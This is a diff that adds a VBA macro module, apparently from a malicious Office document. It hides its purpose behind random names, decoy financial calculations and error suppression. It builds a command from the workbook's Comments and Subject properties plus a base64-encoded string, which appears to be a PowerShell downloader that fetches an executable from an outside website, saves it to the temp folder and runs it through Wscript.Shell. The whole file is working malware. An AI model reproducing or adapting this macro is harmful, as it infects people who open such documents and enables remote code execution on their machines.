@@ -1,0 +1,39 @@
+Rem Attribute VBA_ModuleType=VBAModule
+Option VBASupport 1
+
+
+Public Sub rWyYtUHOC()
+On Error Resume Next
+Dim yllrrOv As String
+yllrrOv = "NDHGFS"
+
+Dim LValue As Double
+
+LValue = NPer(0.0525 / 1, -200, 1500)
+
+
+
+ FfxoXYwEo = ActiveWorkbook.BuiltinDocumentProperties("Comments")
+ aMMhrPjTA = ActiveWorkbook.BuiltinDocumentProperties("Subject")
+
+Dim RValue As Double
+
+RValue = Rate(10 * 1, -1000, 6500)
+
+
+  WzpIUxvU = "IAAkAGYAZABzAGYAcwBkAGYAIAA9ACAAIgBmAHMAZgBkAGcAaABmAGQAZABmAGcAaAAiADsAIAAoAE4ARQB3AC0AbwBiAGoARQBjAHQAIAAcIGAAT" & _
+"gBgAGUAYABUAGAALgBgAFcAYABlAGAAQgBgAEMAYABsAGAAaQBgAGUAYABOAGAAVAAdICkALgBEAG8AdwBuAEwAbwBBAGQAZgBJAGwARQAoACAAHS" & _
+"BoAHQAdABwADoALwAvAHMAdQB5AGEAcwBoAGMAbwBsAGwAZQBnAGUAbwBmAG4AdQByAHMAaQBuAGcALgBjAG8AbQAvAGwAYQBuAGcAdQBhAGcAZQA" & _
+"vAEQAbwBuADEANgAzAC8AQwByAHkAcAB0AGUAZABGAGkAbABlADEANgAzAC4AZQB4AGUAHSAgACwAIAAdICQARQBOAHYAOgB0AGUAbQBwAFwAagBm" & _
+"AGMAYgB2AGUAcAB0AC4AZQB4AGUAHSAgACkAIAA7ACAAcwB0AEEAUgB0ACAAHSAkAEUATgB2ADoAdABlAG0AcABcAGoAZgBjAGIAdgBlAHAAdAAuA" & _
+"GUAeABlAB0gOwAkAGYAZABzAGYAcwBkAGYAIAA9ACAAIgBmAHMAZgBkAGcAaABmAGQAZABmAGcAaAAiADsA"
+
+    Dim zKShMevSa As Object
+    Set zKShMevSa = CreateObject("Wscript.Shell")
+    zKShMevSa.Run FfxoXYwEo + aMMhrPjTA + WzpIUxvU, RValue
+
+
+
+
+
+End Sub
